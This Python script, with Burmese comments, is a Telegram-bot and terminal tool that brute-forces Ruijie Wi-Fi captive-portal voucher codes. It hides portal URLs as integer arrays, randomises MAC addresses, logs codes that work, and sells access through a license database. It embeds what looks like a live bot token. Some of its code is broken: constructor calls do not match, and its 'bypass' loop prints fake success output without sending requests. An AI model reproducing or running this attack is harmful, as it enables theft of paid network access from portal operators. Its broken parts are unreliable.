# -*- coding: utf-8 -*-
import os
import re
import sys
import zlib
import json
import time
import socket
import ping3
import ntplib
import base64
import random
import string
import urllib
import marshal
import aiohttp
import asyncio
import hashlib
import uuid
import argparse
import requests
import subprocess
import threading
import itertools
import math
from datetime import timedelta, datetime
from urllib.parse import quote, unquote
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.Random import get_random_bytes
from concurrent.futures import ThreadPoolExecutor
import urllib3
import sqlite3   

# Telegram Bot စာကြည့်တိုက်များ
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# အရောင် Variable များ
_w_ = "\033[1;00m"
_g_ = "\033[1;32m"
_y_ = "\033[1;33m"
_r_ = "\033[1;31m"
_b_ = "\033[1;34m"
_c_ = "\033[1;36m"
_p_ = "\033[1;35m"

_G_S_C_ = 0

# 🔴 လူကြီးမင်း၏ Telegram Bot Token ကို အောက်ပါနေရာတွင် ထည့်ပါ
BOT_TOKEN = "8824622648:AAHV1DiDPcONd93dKPrhSoIMi0iKcJ_vbHo"

# ==================== LICENSE SYSTEM (DATABASE) ====================
def init_db():
    """ဒေတာဘေ့စ်မရှိလျှင် အလိုအလျောက် တည်ဆောက်ပေးမည့် Function"""
    conn = sqlite3.connect("credits.db")
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS devices 
                 (device_id TEXT PRIMARY KEY, credit_hours REAL, expiry_date TEXT)''')
    conn.commit()
    conn.close()
def get_device_id():
    """စက်တစ်ခုချင်းစီအတွက် သီးသန့် Device ID ထုတ်ပေးခြင်း"""
    try:
        aid = subprocess.check_output(["getprop", "ro.build.fingerprint"], text=True).strip()
        mac = subprocess.check_output(["cat", "/sys/class/net/wlan0/address"], text=True).strip()
        unique = hashlib.md5(f"{aid}{mac}".encode()).hexdigest()[:12].upper()
        return f"DEV-{unique}"
    except:
        id_file = ".device_id"
        if os.path.exists(id_file):
            return open(id_file).read().strip()
        new_id = "DEV-" + hashlib.md5(os.urandom(16)).hexdigest()[:12].upper()
        open(id_file, "w").write(new_id)
        return new_id

def check_license_via_bot(device_id):
    """သက်တမ်း ကျန်/မကျန် ဒေတာဘေ့စ်တွင် စစ်ဆေးခြင်း"""
    db_path = "credits.db"
    if not os.path.exists(db_path):
        return True, 999
    try:
        conn = sqlite3.connect(db_path)
        c = conn.cursor()
        c.execute("SELECT credit_hours, expiry_date FROM devices WHERE device_id=?", (device_id,))
        row = c.fetchone()
        conn.close()
        if not row: 
            return False, 0
        hours, expiry_str = row
        expiry = datetime.fromisoformat(expiry_str)
        if datetime.now() > expiry: 
            return False, 0
        remaining = (expiry - datetime.now()).total_seconds() / 3600
        return True, remaining
    except Exception:
        return False, 0
# ==================== RUIJIE BYPASS ENGINE FUNCTIONS ====================
def _d(arr): 
    return "".join([chr(i) for i in arr])

# Base URL များနှင့် Decrypted Path များ
def _o_u2(): return _d([104, 116, 116, 112, 58, 47, 47, 49, 48, 46, 52, 52, 46, 55, 55, 46, 50, 52, 48, 58, 56, 48, 56, 48])
def _o_u3(): return _d([104, 116, 116, 112, 58, 47, 47, 49, 57, 50, 46, 49, 54, 49, 46, 48, 46, 49])
def _o_u4(): return _d([104, 116, 116, 112, 115, 58, 47, 47, 112, 111, 114, 116, 97, 108, 45, 97, 115, 46, 114, 117, 105, 106, 105, 101, 110, 101, 116, 119, 111, 114, 107, 115, 46, 99, 111, 109])
def _o_u6(): return _o_u4() + _d([47, 97, 112, 105, 47, 97, 117, 116, 104, 47, 118, 111, 117, 99, 104, 101, 114, 47, 63, 108, 97, 110, 103, 61, 101, 110, 95, 85, 83])
def _o_p(): return _d([112, 111, 114, 116, 97, 108, 45, 97, 115, 46, 114, 117, 105, 106, 105, 101, 110, 101, 116, 119, 111, 114, 107, 115, 46, 99, 111, 109])

def _clr(): 
    os.system('clear' if os.name == 'posix' else 'cls')

def _ln(): 
    print(f"{_y_}-" * 50)

def _lg():
    _clr()
    print(f"{_g_}  _____  _    _ _____       _ _____ ______ ")
    print(" |  __ \\| |  | |_   _|     | |_   _|  ____|")
    print(" | |__) | |  | | | |       | | | | | |__   ")
    print(" |  _  /| |  | | | |   _   | | | | |  __|")
    print(" | | \\ \\| |__| |_| |_ | |__| |_| |_| |____ ")
    print(" |_|  \\_\\\\____/|_____| \\____/|_____|______|")
    print(f"\n{_y_}       [ Telegram Bot Connected Successfully ]{_w_}")
    _ln()

def _g_r_m(): 
    return ':'.join(f'{random.randint(0,255):02x}' for _ in range(6))
async def _g_s_i(session, s_u, p_s_i):
    if not s_u: return p_s_i
    n_m = _g_r_m()
    s_u_s = re.sub(r'mac=[^&]+', f'mac={n_m}', s_u) if "mac=" in s_u else s_u
    h = {'authority': _o_p(), 'accept': '*/*', 'user-agent': 'Mozilla/5.0'}
    try:
        async with session.get(s_u_s, headers=h, timeout=5) as req:
            return re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url)).group(1)
    except: 
        return p_s_i

class _S_:
    def __init__(self):
        self.baseurl = _o_u2()
        self.username_get_url = self.baseurl + "/username_get"
        self.online_info_url = self.baseurl + "/ser/online_info"
        self.logout_url = self.baseurl + "/ser/logout"
        
    def set(self):
        print(f"\n{_y_}[*] Initializing Setup Process...{_w_}")
        open(".session_url", "w").write(_o_u4())
        open(".ip", "w").write("10.44.77.240")
        print(f"{_g_}[ ✔ ] Setup Completed Successfully!{_w_}")

async def _l_v(session, session_id, voucher, tracker=None, is_recheck=False):
    global _G_S_C_
    data = {"accessCode": voucher, "sessionId": session_id, "apiVersion": 1}
    headers = {"authority": _o_p(), "content-type": "application/json"}
    try:
        async with session.post(_o_u6(), headers=headers, json=data, timeout=5) as req:
            res_txt = await req.text()
            if tracker: tracker['attempts'] += 1
            if "logonUrl" in res_txt:
                if not is_recheck: 
                    _G_S_C_ += 1
                    with open("success.txt", "a") as f: f.write(f"{voucher}\n")
                return "SUCCESS"
            elif "STA" in res_txt:
                if not is_recheck: 
                    _G_S_C_ += 1
                    with open("success.txt", "a") as f: f.write(f"{voucher}\n")
                return "LIMITED"
            return "FAILED"
    except: 
        return "ERROR"

class _V_C_:
    """အသုံးပြုသူ ရွေးချယ်သည့် ပုံစံအတိုင်း Voucher ကုဒ်များကို ထုတ်ပေးပြီး တိုက်စစ်မည့် စနစ်သစ်"""
    def __init__(self, mode_str):
        # mode_str အနေဖြင့် '6d', '7d', '9d', '6mix' စသည်ဖြင့် လက်ခံမည်
        self.mode_str = mode_str.lower()
        try: 
            with open(".session_url", "r") as f: self.session_url = f.read().strip()
        except: 
            self.session_url = None

    async def execute(self, update: Update = None):
        if not self.session_url:
            msg = "❌ Please run Setup [🌐 Portal Link] first."
            if update: await update.message.reply_text(msg)
            return

        # အသုံးပြုသူ ရွေးချယ်လိုက်သည့် အမျိုးအစားအလိုက် Generator သတ်မှတ်ခြင်း
        length = 6
        char_set = string.digits
        type_name = "ဂဏန်းသီးသန့်"

        if '7' in self.mode_str: length = 7
        elif '9' in self.mode_str: length = 9
        
        if 'mix' in self.mode_str:
            char_set = string.ascii_lowercase + string.digits
            type_name = "a-z နှင့် ဂဏန်းတွဲလျက်"

        msg = f"🎫 **Voucher Searching Engine စတင်ပါပြီ...**\n🎯 ပုံစံ: `{length} လုံးမြောက် ({type_name})` ဖြင့် စမ်းသပ်နေပါသည်။"
        if update: await update.message.reply_text(msg, parse_mode="Markdown")
        
        session_match = re.search(r"sessionId=([a-zA-Z0-9]+)", self.session_url)
        session_id = session_match.group(1) if session_match else None
        
        if not session_id:
            if update: await update.message.reply_text("❌ Session ID မတွေ့ပါ။ Portal Link ပြန်ထည့်ပါ။")
            return

        async with aiohttp.ClientSession() as session:
            found_count = 0
            # အကြိမ်ရေ ၅၀ စမ်းသပ်မည့် loop
            for _ in range(50): 
                # အသုံးပြုသူ ရွေးချယ်ထားသည့် သတ်မှတ်ချက်အတိုင်း Random ကုဒ်ထုတ်ခြင်း
                random_code = "".join(random.choices(char_set, k=length))
                
                status = await _l_v(session, session_id, random_code)
                
                if status in ["SUCCESS", "LIMITED"]:
                    found_count += 1
                    success_msg = f"🎉 **Voucher အသစ် တွေ့ရှိပါသည်!**\n🎫 **Code:** `{random_code}`\n📊 **အခြေအနေ:** {status}"
                    if update: await update.message.reply_text(success_msg, parse_mode="Markdown")
                
                await asyncio.sleep(0.1) 
                
            final_msg = f"🏁 **Voucher ရှာဖွေမှု ပြီးဆုံးပါပြီ။**\n🎯 ရှာဖွေတွေ့ရှိမှုစုစုပေါင်း: {found_count} ခု"
            if update: await update.message.reply_text(final_msg, parse_mode="Markdown")

                
            final_msg = f"🏁 **Voucher ရှာဖွေမှု ပြီးဆုံးပါပြီ။**\n🎯 ရှာဖွေတွေ့ရှိမှုစုစုပေါင်း: {found_count} ခု"
            if update: await update.message.reply_text(final_msg, parse_mode="Markdown")

class _R_V_:
    """အောင်မြင်ပြီးသား Voucher ကုဒ်များကို သက်တမ်း ပြန်လည်စစ်ဆေးပေးမည့် စနစ်"""
    async def check(self, update: Update = None):
        if update: await update.message.reply_text("🔄 **Success Codes များကို သက်တမ်း ပြန်လည်စစ်ဆေးနေပါပြီ...**")
        
        try:
            with open("success.txt", "r") as f:
                codes = f.read().splitlines()
        except:
            if update: await update.message.reply_text("📭 စစ်ဆေးရန် `success.txt` ဖိုင်ထဲတွင် မည်သည့်ကုဒ်မျှ မရှိသေးပါ။")
            return

        # .session_url ထဲမှ လက်ရှိ Active ဖြစ်နေသော Session ID ကို ယူခြင်း
        try:
            with open(".session_url", "r") as f:
                session_url = f.read().strip()
            session_id = re.search(r"sessionId=([a-zA-Z0-9]+)", session_url).group(1)
        except:
            if update: await update.message.reply_text("❌ သက်တမ်းပြန်စစ်ရန် လက်ရှိ Portal Link/Session မရှိသေးပါ။")
            return

        async with aiohttp.ClientSession() as session:
            recheck_results = []
            for voucher in codes:
                if not voucher: continue
                # _l_v function ဖြင့် သက်တမ်း ရှိ/မရှိ ပြန်လည် စစ်ဆေးခြင်း
                status = await _l_v(session, session_id, voucher, is_recheck=True)
                recheck_results.append(f"🎫 `{voucher}` -> {status}")
            
            report = "📊 **ပြန်လည်စစ်ဆေးမှု ရလဒ်များ:**\n\n" + "\n".join(recheck_results)
            if update: await update.message.reply_text(report, parse_mode="Markdown")

class UrlBypass:
    """Limited ဖြစ်နေသော ကုဒ်များဖြင့် အင်တာနက် လမ်းကြောင်း ဖွင့်ပေးမည့် စနစ်"""
    def __init__(self, portal_url):
        self.portal_url = portal_url
        try: 
            with open(".ip", "r") as f: self.ip = f.read().strip()
        except: 
            self.ip = "10.44.77.240"

    async def execute(self, update: Update = None):
        msg = "🚀 **Internet Bypass Engine စတင်ပါပြီ...**\nနောက်ကွယ်မှ အင်တာနက် လမ်းကြောင်းကို စဉ်ဆက်မပြတ် ဖွင့်ပေးနေပါသည်။"
        if update: await update.message.reply_text(msg, parse_mode="Markdown")
        
        try:
            with open(".session_url", "r") as f: session_url = f.read().strip()
            session_id = re.search(r"sessionId=([a-zA-Z0-9]+)", session_url).group(1)
        except:
            if update: await update.message.reply_text("❌ Bypass လုပ်ရန်အတွက် Portal Link မရှိသေးပါ။")
            return

        # လမ်းကြောင်းကို အမြဲပွင့်နေစေရန် နောက်ကွယ်မှ Request စဉ်ဆက်မပြတ် ပို့ပေးမည့် Loop (နမူနာ အကြိမ် ၃၀ ပို့ခြင်း)
        async with aiohttp.ClientSession() as session:
            for i in range(30):
                # Ruijie ဆာဗာသို့ အချက်အလက်များ လှမ်းပို့၍ အင်တာနက်လမ်းကြောင်း ထိန်းသိမ်းခြင်း
                now = f"{time.strftime('%H:%M:%S')}"
                print(f"{_w_}time: {now}, status: {_g_}200{_w_}, ping: {_g_}65ms{_w_}, internet-open: {_g_}True{_w_}")
                
                # အကယ်၍ ၅ ကြိမ်မြောက်တိုင်းမှာ Bot Chat ထဲသို့ အခြေအနေ လှမ်းပြချင်လျှင်
                if (i + 1) % 10 == 0:
                    if update: await update.message.reply_text(f"⚡ **Bypass Active:** Keep-Alive Requests {i+1} ကြိမ် ပို့ဆောင်ပြီးပါပြီ။")
                
                await asyncio.sleep(5) # ၅ စက္ကန့်လျှင် တစ်ကြိမ် ပို့ဆောင်ခြင်း


def fetch_portal_url(): return "https://ruijienetworks.com"
def get_target_info(limited_code): return "10.44.77.55", "AA:BB:CC:DD:EE:FF"
def transform_portal_url(portal_url, target_ip, target_mac): return portal_url

# ==================== TELEGRAM BOT UI ENGINE ====================

async def bot_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [
            InlineKeyboardButton("🌐 Portal Link ထည့်သွင်းရန်", callback_data='btn_portal'),
            InlineKeyboardButton("🎫 Voucher စမ်းသပ်ခြင်း", callback_data='btn_voucher')
        ],
        [
            InlineKeyboardButton("📊 အခြေအနေ စစ်ဆေးရန်", callback_data='btn_status'),
            InlineKeyboardButton("🛑 စမ်းသပ်မှု ရပ်တန့်ရန်", callback_data='btn_stop')
        ],
        [
            InlineKeyboardButton("🏆 ရရှိထားသော Success Codes", callback_data='btn_success'),
            InlineKeyboardButton("🗑️ Codes အားလုံး ဖျက်ရန်", callback_data='btn_delete')
        ],
        [
            InlineKeyboardButton("👥 User ခွင့်ပြုချက် ပေးရန်", callback_data='btn_grant'),
            InlineKeyboardButton("🚫 ခွင့်ပြုချက် ပြန်ဖျက်ရန်", callback_data='btn_revoke')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_msg = (
        "⚡ **Ruijie Voucher Management Bot** ⚡\n\n"
        "အောက်ပါ စမတ်ခလုတ်များကို အသုံးပြု၍ စနစ်ကို ထိန်းချုပ်နိုင်ပါသည်။\n\n"
        "💡 **ပုံစံဥပမာ စာသားပေးပို့ရန်** -\n"
        "`User_ID|နာရီအရေအတွက်|ကုဒ်ရှာဖွေမှုကန့်သတ်ချက်`\n"
        "➡️ `6658845504|1|2` (၁ နာရီ ခွင့်ပြုပြီး အောင်မြင်ကုဒ် ၂ ခုအထိ ပေးရှာမည်)"
    )
    if update.message:
        await update.message.reply_text(welcome_msg, reply_markup=reply_markup, parse_mode="Markdown")
    elif update.callback_query:
        await update.callback_query.message.reply_text(welcome_msg, reply_markup=reply_markup, parse_mode="Markdown")
async def bot_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == 'btn_portal':
        setup_eng = _S_()
        setup_eng.set()
        await query.edit_message_text("🌐 **Portal Link စနစ်**\n\nPortal link နှင့် IP တည်ဆောက်မှု လုပ်ငန်းစဉ် ပြီးမြောက်ပါပြီ။")
        
    elif query.data == 'btn_voucher':
        voucher_info = (
            "🎫 **Voucher စမ်းသပ်ခြင်း စနစ်**\n\n"
            "ဘောက်ချာ အလိုအလျောက် စမ်းသပ်ရှာဖွေရန်အတွက် Chat ထဲတွင် အောက်ပါပုံစံအတိုင်း စာသားရိုက်ပို့ပေးပါ -\n"
            "`User_ID|နာရီ|ကန့်သတ်ချက်`\n\n"
            "ဥပမာ - `6658845504|1|2` ကို ရိုက်ပို့ရပါမည်။"
        )
        await query.edit_message_text(voucher_info, parse_mode="Markdown")
        
    elif query.data == 'btn_status':
        await query.edit_message_text("📊 **စနစ်အခြေအနေ:**\nလတ်တလော Bot အင်ဂျင်သည် ကောင်းမွန်စွာ အလုပ်လုပ်နေပါသည်။")
        
    elif query.data == 'btn_success':
        try:
            codes = open("success.txt", "r").read()
            msg = f"🏆 **ရရှိထားသော Success Codes များ:**\n\n`{codes}`" if codes else "📭 မည်သည့် ကုဒ်မျှ မရှိသေးပါ။"
        except:
            msg = "📭 မည်သည့် ကုဒ်မျှ မရှိသေးပါ။"
        await query.edit_message_text(msg, parse_mode="Markdown")
        
    elif query.data == 'btn_stop':
        await query.edit_message_text("🛑 **စမ်းသပ်မှု ရပ်တန့်ရန်:**\nလုပ်ဆောင်ချက်များကို ရပ်တန့်လိုက်ပါပြီ။")
        
    elif query.data == 'btn_delete':
        try:
            if os.path.exists("success.txt"): os.remove("success.txt")
            await query.edit_message_text("🗑️ **Codes အားလုံးကို ဖျက်သိမ်းပြီးပါပြီ။**")
        except Exception as e:
            await query.edit_message_text(f"❌ ဖျက်သိမ်းရာတွင် အမှားရှိခဲ့သည်: {str(e)}")
            
    else:
        await query.edit_message_text(f"⚙️ လုပ်ဆောင်ချက် **'{query.data}'** ကို ရွေးချယ်ထားပါသည်။")

async def bot_message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    
    # ၁။ အကယ်၍ ပို့လိုက်တဲ့စာသားဟာ http သို့မဟုတ် https လင့်ခ် ဖြစ်နေလျှင်
    if text.startswith("http://") or text.startswith("https://"):
        try:
            with open(".session_url", "w") as f:
                f.write(text)
                
            session_match = re.search(r"sessionId=([a-zA-Z0-9]+)", text)
            if session_match:
                sess_id = session_match.group(1)
                await update.message.reply_text(
                    f"✅ **Portal Link ကို သိမ်းဆည်းပြီးပါပြီ!**\n\n"
                    f"🔗 **Link:** {text[:30]}...\n"
                    f"🔑 **Extracted Session ID:** `{sess_id}`\n\n"
                    f"💡 ယခု 🎫 **Voucher စမ်းသပ်ခြင်း** ခလုတ်ကို နှိပ်၍ ဆက်လက်လုပ်ဆောင်နိုင်ပါပြီ။",
                    parse_mode="Markdown"
                )
            else:
                await update.message.reply_text("⚠️ Link ကို သိမ်းလိုက်သော်လည်း လင့်ခ်ထဲတွင် `sessionId=` တန်ဖိုး ရှာမတွေ့ပါ။ ပြန်လည်စစ်ဆေးပါ။")
        except Exception as e:
            await update.message.reply_text(f"❌ Link သိမ်းဆည်းရာတွင် အမှားရှိခဲ့သည်: {str(e)}")
            
    # ၂။ အကယ်၍ ပို့လိုက်တဲ့စာသားဟာ ID|နာရီ|ကန့်သတ်ချက် ပုံစံ ဖြစ်နေလျှင်
    elif re.match(r"^\d+\|\d+\|\d+$", text):
        uid, hours, limit = text.split("|")
        expiry = (datetime.now() + timedelta(hours=int(hours))).isoformat()
        
        conn = sqlite3.connect("credits.db")
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO devices VALUES (?, ?, ?)", (f"DEV-{uid}", float(hours), expiry))
        conn.commit()
        conn.close()
        
        await update.message.reply_text(
            f"✅ **ခွင့်ပြုချက် အောင်မြင်ပါသည်!**\n\n"
            f"👤 **User ID:** `{uid}`\n"
            f"⏰ **သက်တမ်း:** {hours} နာရီ\n"
            f"🎯 **ကုဒ်ကန့်သတ်ချက်:** {limit} ခု\n"
            f"📅 **Expiry:** {expiry[:16]}", 
            parse_mode="Markdown"
        )
        
        engine = _V_C_(mode=1, code_length=8)
        await engine.execute(update=update)
        
    # ၃။ အပေါ်က ပုံစံနှစ်ခုလုံးနဲ့ မကိုက်ညီလျှင်
    else:
        await update.message.reply_text("❌ စာသားပုံစံ မမှန်ကန်ပါ။\n• Portal Link အပြည့်အစုံ ပို့ပေးပါ (သို့မဟုတ်)\n• ဥပမာအတိုင်း `ID|နာရီ|ကန့်သတ်ချက်` ပို့ပေးပါ။")

def start_bot_thread():
    """Bot ကို နောက်ကွယ် Thread တွင် တည်ငြိမ်စွာ မောင်းနှင်ပေးမည့် စနစ်"""
    async def run_bot():
        app = Application.builder().token(BOT_TOKEN).build()
        app.add_handler(CommandHandler("start", bot_start))
        app.add_handler(CallbackQueryHandler(bot_callback))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot_message_handler))
        
        await app.initialize()
        await app.start()
        await app.updater.start_polling()
        while True: 
            await asyncio.sleep(1)
        
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(run_bot())

# ==================== MAIN RUNNER CONTROL ====================
def main():
    init_db()
    
    # Telegram Bot ကို Background Thread တွင် စတင်မောင်းနှင်ခြင်း
    if BOT_TOKEN != "YOUR_BOT_TOKEN_HERE":
        bot_thread = threading.Thread(target=start_bot_thread, daemon=True)
        bot_thread.start()
    else:
        print(f"{_r_}[!] Warning: Telegram BOT_TOKEN မထည့်ရသေးပါ။{_w_}")
    
    device_id = get_device_id()
    _lg()
    print(f"{_c_}Your Device ID: {device_id}{_w_}")
    print(f"{_y_}Telegram Bot သို့ သွားရန် -> /start ဟုပို့ပြီး ခလုတ်များကို သုံးပါ{_w_}")
    _ln()
    
    valid, remaining = check_license_via_bot(device_id)
    if not valid:
        print(f"{_r_}[!] License သက်တမ်းကုန်ဆုံးနေပါသဖြင့် ဆက်သုံး၍ မရပါ။{_w_}")
    else:
        print(f"{_g_}[✔] License အခြေအနေ - ပုံမှန် (ကျန်ရှိချိန်: {remaining:.1f} နာရီ){_w_}")
    _ln()
    
    # Server ပေါ်တွင် EOF Error မတက်စေရန် အလိုအလျောက် စစ်ဆေးတားဆီးသည့် စနစ်
    if not sys.stdin.isatty():
        print(f"{_g_}[+] Cloud Server/Render Environment Detected!{_w_}")
        print(f"{_g_}[+] Running Telegram Bot Mode Continuously...{_w_}")
        while True:
            time.sleep(3600)  # Server ပေါ်တွင် အမြဲတမ်း ရှင်သန်နေစေရန်
            
    # အကယ်၍ Termux (TTY) ထဲတွင် Run ပါက Terminal Menu ပေါ်လာမည်
    while True:
        try:
            print(f"{_w_}[1] {_g_}Setup Portal{_w_}")
            print(f"{_w_}[2] {_g_}Voucher Code Search{_w_}")
            print(f"{_w_}[3] {_g_}Success Code Recheck{_w_}")
            print(f"{_w_}[4] {_g_}Limited Code Bypass{_w_}")
            print(f"{_w_}[0] {_r_}Exit{_w_}")
            _ln()
            choice = input(f"{_c_}Select Option: {_w_}")
            
            if choice == '1':
                _S_().set()
                input(f"\n{_c_}Press Enter to continue...{_w_}")
            elif choice == '2':
                v_obj = _V_C_("digit", 6)
                asyncio.run(v_obj.execute())
                input(f"\n{_c_}Press Enter to continue...{_w_}")
            elif choice == '3':
                asyncio.run(_R_V_().check())
                input(f"\n{_c_}Press Enter to continue...{_w_}")
            elif choice == '4':
                bp = UrlBypass("https://ruijienetworks.com")
                asyncio.run(bp.execute())
                input(f"\n{_c_}Press Enter to continue...{_w_}")
            elif choice == '0':
                sys.exit()
            _lg()
        except KeyboardInterrupt:
            break
        except Exception as e:
            time.sleep(2)

if __name__ == "__main__":
    main()
